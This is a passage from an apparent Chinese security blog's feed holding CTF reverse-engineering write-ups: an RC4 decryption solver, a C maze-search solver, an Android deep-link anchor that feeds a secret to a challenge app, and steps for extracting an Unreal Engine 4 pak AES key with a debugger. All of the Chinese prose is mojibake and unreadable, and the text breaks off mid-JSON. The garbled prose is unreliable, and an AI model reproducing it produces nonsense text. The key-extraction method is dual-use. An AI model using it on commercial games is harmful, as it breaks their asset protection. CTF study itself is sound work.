enc[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">70</span>, <span class="number">119</span>, <span class="number">116</span>, <span class="number">176</span>, <span class="number">39</span>, <span class="number">142</span>, <span class="number">143</span>, <span class="number">91</span>, <span class="number">233</span>, <span class="number">216</span>, </span><br><span class="line">  <span class="number">70</span>, <span class="number">156</span>, <span class="number">114</span>, <span class="number">231</span>, <span class="number">47</span>, <span class="number">94</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> s[] = <span class="string">"OVMF_And_Easy_Bios"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, v13[<span class="number">514</span>] = &#123;<span class="number">0</span>&#125;, v2, v3, v4, v5, v6, v8;</span><br><span class="line"><span class="keyword">int</span> v7, v9, v10, v11, v12, result;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i != <span class="number">256</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v13[i] = i;</span><br><span class="line">    v13[i + <span class="number">256</span>] = s[i % <span class="number">18</span>];</span><br><span class="line">  &#125;</span><br><span class="line">v2 = <span class="number">0</span>;</span><br><span class="line">v3 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">v4 = v13[v2];</span><br><span class="line">v3 = (v13[v2 + <span class="number">256</span>] + v4 + v3) % <span class="number">256</span>;</span><br><span class="line">v5 = v13[v3];</span><br><span class="line">v13[v3] = v4;</span><br><span class="line">v13[v2++] = v5;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> ( v2 != <span class="number">256</span> );</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">v8 = (v8 + <span class="number">1</span>);</span><br><span class="line">    v9 = v13[v8];</span><br><span class="line">    v10 = (v9 + v7) % <span class="number">256</span>;</span><br><span class="line">    v11 = v13[v10];</span><br><span class="line">    v13[v10] = v9;</span><br><span class="line">    v7 = (v9 + v7) % <span class="number">256</span>;</span><br><span class="line">    v13[v8] = v11;</span><br><span class="line">    result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v13[(v11 + v13[v10]) % <span class="number">256</span>];</span><br><span class="line">    enc[v6++] ^= result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> ( v6 != <span class="number">16</span> );</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%02x"</span>, enc[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">//88baec0b5154f859b5851097bb567f5c</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;äºŒè¿›åˆ¶ä¸“åœºï¼ŒReverseåšå®Œäº†ï¼Œå†…æ ¸å®‰å…¨åšäº†1ä¸ªï¼Œå›ºä»¶å®‰å…¨åšäº†3ä¸ªã€‚æ€»çš„æ¥è¯´é¢˜ç›®éš¾åº¦ä¸æ˜¯å¾ˆå¤§ï¼Œä½†è€ƒç‚¹è¿˜è¡Œã€‚æ’åç¬¬ä¸€ï¼Œä¸ªäººåšäº†1820åˆ†ï¼Œå…¶ä¸­pwnæ˜¯i0ganåšçš„ã€‚&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://www.Bxnop.cn/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>DJBCTF</title>
    <link href="https://www.bxnop.cn/2021/01/26/DJBCTF/"/>
    <id>https://www.bxnop.cn/2021/01/26/DJBCTF/</id>
    <published>2021-01-26T03:07:43.000Z</published>
    <updated>2021-04-18T01:19:57.077Z</updated>
    
    <content type="html"><![CDATA[<p>æ•´ä½“æ„Ÿè§‰Reæœ‰ç‚¹åæ‚ï¼Œæœ‰æ”¶è·ï¼Œä¸»è¦æ˜¯æ‹¿äº†ä¸ªæ¯å­ï¼Œhhaã€‚ã€‚</p><a id="more"></a><h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="A-Maze-In"><a href="#A-Maze-In" class="headerlink" title="A-Maze-In"></a>A-Maze-In</h3><p>è¿·å®«é¢˜ï¼Œä½†æ˜¯æœ‰ç‚¹ç‰¹åˆ«ï¼Œå°±æ˜¯æ¯ä¸ªæ­¥éª¤å¯¹åº”çš„åœ°å›¾ä¸ä¸€æ ·ã€‚ã€‚</p><p><img src="/2021/01/26/DJBCTF/image-20210126111337271-1611648503131.png" alt="image-20210126111337271"></p><p>æå–å‡º4ä¸ªåœ°å›¾åï¼Œå¼€å§‹æ‰‹èµ°äº†ä¸€ä¸‹ï¼Œè¦å‘½ã€‚ã€‚æƒ³åˆ°å†™ä¸€ä¸ªdfsæ¥æœç´¢ï¼Œè¿™ä¸ªåº”è¯¥æ˜¯å¯è¡Œçš„ï¼Œä½†æˆ‘æ²¡æœ‰æ³¨æ„å¥½èµ°è¿‡çš„è·¯å¾„æ ‡è®°å¯¼è‡´ä¸€ç›´é™·å…¥äº†å¾ªç¯ï¼Œæ‰¾ä¸è§£ã€‚ã€‚</p><p>åé¢ä»é€†å‘çš„è§’åº¦çœ‹ï¼Œè¿™ä¸ªè™½ç„¶æ­£ç€èµ°éº»çƒ¦ï¼Œä½†æ˜¯ä»ç»ˆç‚¹èµ°åˆ°èµ·ç‚¹æ˜¯æ¯ä¸€æ­¥éƒ½ç¡®å®šçš„ï¼Œèµ°é‚£ä¸€æ­¥çœ‹å®ƒåæ–¹å‘æ˜¯ä¸æ˜¯ä¸º1å³å¯ã€‚</p><p>å› ä¸ºæ¯ä¸€æ­¥ç¡®å®šè¿˜æ˜¯æ¯”è¾ƒå¥½èµ°çš„ï¼š<strong>LLDRRDLLLDRDLDDDRRULURRULURRDDDLDR</strong></p><p>èµ›åå¯¹æˆ‘ä¹‹å‰å†™çš„dfsï¼Œå‘ç°ä¸»è¦æ˜¯æ¯æ¬¡å¾€å›èµ°å¯¼è‡´ä¸€ç›´é™·å…¥ä¸€ä¸ªæ­»èƒ¡åŒï¼Œå°±æ˜¯èµ°äº†Lç„¶åèµ°Rï¼Œé‚£æ¯æ¬¡èµ°ä¹‹å‰åŠ äº†ä¸ªåˆ¤æ–­è¯•è¯•ã€‚ã€‚æœç„¶ï¼Œç§’å‡ºã€‚ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> byte_404018[] =</span><br><span class="line">&#123;</span><br><span class="line">    <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> i, <span class="keyword">int</span> v5, <span class="keyword">int</span> v4, <span class="keyword">char</span> ch)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> j = <span class="number">0</span>, k = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(i &gt; <span class="number">33</span> ) </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(v4 == <span class="number">4</span>  &amp;&amp; v5 == <span class="number">7</span>) </span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"yes: %s\n"</span>, flag);</span><br><span class="line">getchar();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (ch != <span class="string">'L'</span> &amp;&amp; (v5 &gt;= <span class="number">0</span> &amp;&amp; v4 &gt;= <span class="number">0</span>) &amp;&amp; (byte_404018+<span class="number">3</span>)[<span class="number">32</span> * v5 + <span class="number">4</span> * v4] == <span class="number">1</span> )</span><br><span class="line">  &#123; </span><br><span class="line">flag[i] = <span class="string">'R'</span>;</span><br><span class="line">    dfs(i+<span class="number">1</span>, v5, v4+<span class="number">1</span>, <span class="string">'R'</span>);</span><br><span class="line">  &#125; </span><br><span class="line">   </span><br><span class="line"><span class="keyword">if</span> (ch != <span class="string">'R'</span> &amp;&amp; (v5 &gt;= <span class="number">0</span> &amp;&amp; v4 &gt;= <span class="number">0</span>) &amp;&amp; (byte_404018+<span class="number">2</span>)[<span class="number">32</span> * v5 + <span class="number">4</span> * v4] == <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">flag[i] = <span class="string">'L'</span>;</span><br><span class="line">dfs(i+<span class="number">1</span>, v5, v4<span class="number">-1</span>, <span class="string">'L'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (ch != <span class="string">'U'</span> &amp;&amp; (v5 &gt;= <span class="number">0</span> &amp;&amp; v4 &gt;= <span class="number">0</span>) &amp;&amp; (byte_404018+<span class="number">1</span>)[<span class="number">32</span> * v5 + <span class="number">4</span> * v4] == <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">flag[i] = <span class="string">'D'</span>;</span><br><span class="line"></span><br><span class="line">dfs(i+<span class="number">1</span>, v5+<span class="number">1</span>, v4, <span class="string">'D'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ch != <span class="string">'D'</span> &amp;&amp;  (v5 &gt;= <span class="number">0</span> &amp;&amp; v4 &gt;= <span class="number">0</span>) &amp;&amp; byte_404018[<span class="number">32</span> * v5 + <span class="number">4</span> * v4] == <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">flag[i] = <span class="string">'U'</span>;</span><br><span class="line">dfs(i+<span class="number">1</span>, v5<span class="number">-1</span>, v4, <span class="string">'U'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">dfs(<span class="number">0</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="string">'1'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Matara-Okina"><a href="#Matara-Okina" class="headerlink" title="Matara Okina"></a>Matara Okina</h3><p>æœ¬æ¥æ²¡æ€ä¹ˆåšè¿‡å®‰å“ï¼Œä»è¿™ä¸ªé¢˜å­¦äº†ä¸å°‘ï¼Œæ¯”èµ›æœŸé—´å¤§å¤šæ•°æ—¶é—´éƒ½å»å­¦å®‰å“äº†ï¼Œè™½ç„¶å¯¹è§£å†³æœ¬é¢˜ç”¨ä¸ä¸Šï¼Œä½†ç”±æ­¤æ„Ÿè§‰å®‰å“è¿˜æ˜¯æŒºå¥½ç©çš„ã€‚</p><p>å¼€å§‹æ‹¿åˆ°é¢˜ç›®å¯¹ä¸‹é¢å°±æœ‰ç‚¹ç–‘æƒ‘ï¼š</p><p><img src="/2021/01/26/DJBCTF/image-20210125114031206-1611648521523.png" alt="image-20210125114031206"></p><p>çŸ¥é“æ˜¯å–å‡ºsecretå‚æ•°çš„å€¼ç»è¿‡å¼‚æˆ–è¿ç®—åå’Œä¸€ä¸ªanså­—ç¬¦ä¸²æ¯”è¾ƒä¸€ä¸‹ã€‚é‚£å°±å…ˆæ±‚å‡ºæ¥çœ‹çœ‹ï¼š<strong>Android_scheme_is_FUN</strong></p><p>å¼€å§‹ä»¥ä¸ºè¿™å°±æ˜¯flagï¼Œç»“æœä¸æ˜¯ï¼Œä»”ç»†çœ‹åˆ°æ˜¯æŠŠè¿™ä¸ªå­—ç¬¦ä¸²ä¼ å…¥ä¸€ä¸ªnativeå±‚çš„checkçš„å‡½æ•°çš„ï¼Œé€šè¿‡ä¸€äº›è¿ç®—æ˜¾ç¤ºå‡ºæ¥ã€‚ã€‚å…¶æ¬¡çœ‹åˆ°schemeï¼ŒåŠ ä¸Šä¹‹å‰çš„uriï¼Œçªç„¶æ˜ç™½äº†ã€‚ã€‚å†åˆ°Mainifestçœ‹çœ‹ï¼Œæœç„¶ï¼š</p><p><img src="/2021/01/26/DJBCTF/image-20210125114541846-1611648525744.png" alt="image-20210125114541846"></p><p>å°±ç±»ä¼¼æˆ‘ä»¬ç‚¹å‡»ä¸€ä¸ªé“¾æ¥æ‰“å¼€appä¸€æ ·ï¼Œè‡ªå·±å†™ä¸€ä¸ªç½‘é¡µé“¾æ¥è®©æ‰‹æœºç‚¹ä¸€ä¸‹å°±å¯ä»¥äº†ã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"sh0w://p4th/70/1nput?secret=Android_scheme_is_FUN"</span>&gt;</span>app<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="UnrealFlag"><a href="#UnrealFlag" class="headerlink" title="UnrealFlag"></a>UnrealFlag</h3><p>å¯¹äºè¿™ä¸ªé¢˜ï¼Œå…¶å®å°±æ˜¯ä¸€ä¸ªè§£å¯†ä¸€ä¸ªæ¸¸æˆä¸­åŠ å¯†çš„æ•°æ®ï¼ŒæŒºå®æˆ˜çš„ï¼Œæ¯”èµ›æ—¶æ²¡åšï¼Œä¹Ÿæ˜¯ä¿¡æ¯æœç´¢èƒ½åŠ›æ²¡åˆ°ä½ï¼ŒçŸ¥é“è¦è§£å¯†pakæ–‡ä»¶ä½†æ˜¯googleï¼Œbaiduäº†åŠå¤©éƒ½æ²¡æ‰¾åˆ°ä¸€ä¸ªåˆé€‚çš„æ–‡ç« ã€‚è¿™ä¸ªæ–‡ç« èµ›åçœ‹åˆ°çš„ï¼Œå¾ˆæ¸…æ™°ä¸”å…¨ï¼š<a href="https://blog.jamie.holdings/2019/03/23/reverse-engineering-aes-keys-from-unreal-engine-4-projects/" target="_blank" rel="noopener">Reverse Engineering AES Keys From Unreal Engine 4 Projects</a></p><p>å‰æœŸå‡†å¤‡å°±æ˜¯ä¸‹è½½è¦è§£å¯†æ–‡ä»¶å¯¹åº”æ¸¸æˆä½¿ç”¨çš„è™šå¹»å¼•æ“ç‰ˆæœ¬ï¼Œè¿™é‡Œ4.26ã€‚</p><p>ç„¶åæ‰¾åˆ°è¦è§£å¯†æ–‡ä»¶ä½¿ç”¨çš„keyï¼Œæœ€åä½¿ç”¨ä¸‹è½½å¼•æ“ä¸­æä¾›çš„Urealpak.exeè§£å¯†å³å¯ã€‚</p><p>å¼€å§‹æ‰¾key:</p><p>æ‰¾åˆ°å®‰è£…å¼•æ“ç›®å½•çš„ï¼š<strong>D:\Epic Games\UE_4.26\Engine\Source\Runtime\PakFile\Private\IPlatformFilePak.cpp</strong>æ–‡ä»¶ï¼ŒæŸ¥çœ‹ä»£ç ï¼Œè™½ç„¶è¿™ä¸ªå¼•æ“ç‰ˆæœ¬å¯èƒ½ä¼šæœ‰ä¸€å®šçš„åŒºåˆ«ï¼Œä½†éƒ½æ˜¯DecryptDataä¸‹æ‰‹ï¼šç¬¬ä¸‰ä¸ªå‚æ•°å³æ˜¯ã€‚</p><p><img src="/2021/01/26/DJBCTF/image-20210126140813667-1611648530624.png" alt="image-20210126140813667">)å½“ä¸ºäº†åœ¨è°ƒè¯•çš„æ—¶å€™å¥½å®šä½åˆ°ä¸Šé¢è¿™ä¸ªå‡½æ•°ï¼Œæˆ‘ä»¬ä¸€èˆ¬çš„æ–¹æ³•æ˜¯æ‰¾åˆ°è°ƒç”¨å®ƒçš„åœ°æ–¹ï¼Œç›´åˆ°æœ‰é”™è¯¯å­—ç¬¦ä¸²ä¿¡æ¯å‡ºç°ï¼ˆæ–¹ä¾¿æˆ‘ä»¬å®šä½ï¼‰ã€‚æ‰¾å¼•ç”¨çš„æ—¶å€™å¯èƒ½å‡ºç°å¾ˆå¤šå‡½æ•°è°ƒç”¨å®ƒçš„æƒ…å†µï¼Œä½†ä¸€èˆ¬ä»¥LoadIndex()å‡½æ•°ä¸ºæœ€ä¸Šå±‚çš„å‡½æ•°ï¼Œè‡³äºåŸå› ï¼Œä¸Šé¢æ–‡ç« æœ‰æåˆ°ï¼š</p><p><img src="/2021/01/26/DJBCTF/image-20210126140646329-1611648534391.png" alt="image-20210126140646329"></p><p>ä¸€ç›´å‘ä¸Šå›æº¯æ‰¾åˆ°äº†ç¬¬ä¸€æ¬¡å‡ºç°å­—ç¬¦ä¸²çš„åœ°æ–¹ï¼Œx64æœç´¢çœ‹çœ‹ï¼Œæœ‰çš„ã€‚</p><p><img src="/2021/01/26/DJBCTF/image-20210126142130832-1611648537839.png" alt="image-20210126142130832"></p><p>ç„¶ååœ¨x64ä¸­çœ‹çš„æ—¶å€™ï¼Œæºä»£ç ä¸å…¶åæ±‡ç¼–çš„ç»“æœå¹¶ä¸æ˜¯ä¸€ä¸€å¯¹åº”çš„ï¼Œæœ‰å¯èƒ½ä¸€ä¸ªå‡½æ•°æ˜¯å†…è”å‡½æ•°å’Œåæ±‡ç¼–ç»“æœæ˜¯å¯¹ä¸€ä¸ªå‡½æ•°è¿›è¡Œäº†å±•å¼€ã€‚è¿™é‡Œå°±æ˜¯ï¼š</p><p>é¦–å…ˆçœ‹å®šä½åˆ°å­—ç¬¦ä¸²é‚£ä¸€éƒ¨åˆ†çš„æºä»£ç ï¼š</p><p><img src="/2021/01/26/DJBCTF/image-20210126151157572-1611648541083.png" alt="image-20210126151157572"></p><p>ç„¶åx64ä¸­çš„æƒ…å†µï¼š</p><p><img src="/2021/01/26/DJBCTF/image-20210126151408840-1611648544164.png" alt="image-20210126151408840"></p><p>æ‰€ä»¥è¿™é‡Œç›´æ¥è·Ÿè¿›æˆ‘ä¸‹æ–­ç‚¹çš„å‡½æ•°ï¼Œç„¶åä»æºä»£ç å¯çŸ¥ï¼Œæœ€åå¯ä»ç¬¬ä¸‰ä¸ªå‚æ•°è·å–keyçš„å‡½æ•°åœ¨æœ€åä¸€ä¸ªï¼Œä½†æˆ‘ä»¬åœ¨x64ä¸­çœ‹åˆ°çš„æ˜¯ç¼–è¯‘åçš„ç»“æœï¼Œä¸€èˆ¬ç¼–è¯‘å™¨éƒ½ä¼šåœ¨åˆå§‹å’Œæœ«å°¾æ·»åŠ ä¸€äº›æ£€æŸ¥å‡½æ•°çš„ï¼Œè¿™é‡Œå¤§æ¦‚çŒœä¸€ä¸‹ï¼Œå…ˆåœ¨å€’æ•°ç¬¬äºŒä¸ªå‡½æ•°å¤„ä¸‹æ–­ç„¶åçœ‹r8å¯„å­˜å™¨çš„å€¼ï¼Œå¦‚æœä¸è¡Œç»§ç»­æ¢åˆ«çš„å°±æ˜¯ï¼Œåæ­£èŒƒå›´å°±è¿™ä¹ˆå‡ ä¸ªå‡½æ•°ã€‚</p><p>æˆåŠŸå¾—åˆ°keyï¼Œä»hexè½¬åŒ–ä¸ºbase64å°±å¥½äº†ã€‚</p><p><img src="/2021/01/26/DJBCTF/image-20210126152347350-1611648547783.png" alt="image-20210126152347350"></p><p>æœ€åï¼šUnrealPak.exe accepts a â€œcrypto.jsonâ€ parameter. You will want to create this file somewhere and add the followingï¼Œå³åˆ›å»ºä¸€ä¸ªå’Œä¸‹é¢ç±»ä¼¼çš„æ–‡ä»¶ï¼ŒæŠŠæ‰¾åˆ°çš„keyå†™å…¥æŒ‡å®šä½ç½®ã€‚</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"$types"</span>: &#123;</span><br><span class="line">    <span class="attr">"UnrealBuildTool.EncryptionAndSigning+CryptoSettings, UnrealBuildTool, Version=4.0.0.0, Culture=neutral, PublicKeyToken=null"</span>: <span class="string">"1"</span>,</span><br><span class="line">    <span class="attr">"UnrealBuildTool.EncryptionAndSigning+EncryptionKey, UnrealBuildTool, Version=4.0.0.0, Culture=neutral, PublicKeyToken=null"</span>: <span class="string">"2"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"$type"</span>: <span class="string">"1"</span>,</span><br><span class="line">  <span class="attr">"EncryptionKey"</span>: &#123;</span><br><span class="line">    <span class="attr">"$type"</span>: <span class="string">"2"</span>,</span><br><span class="line">   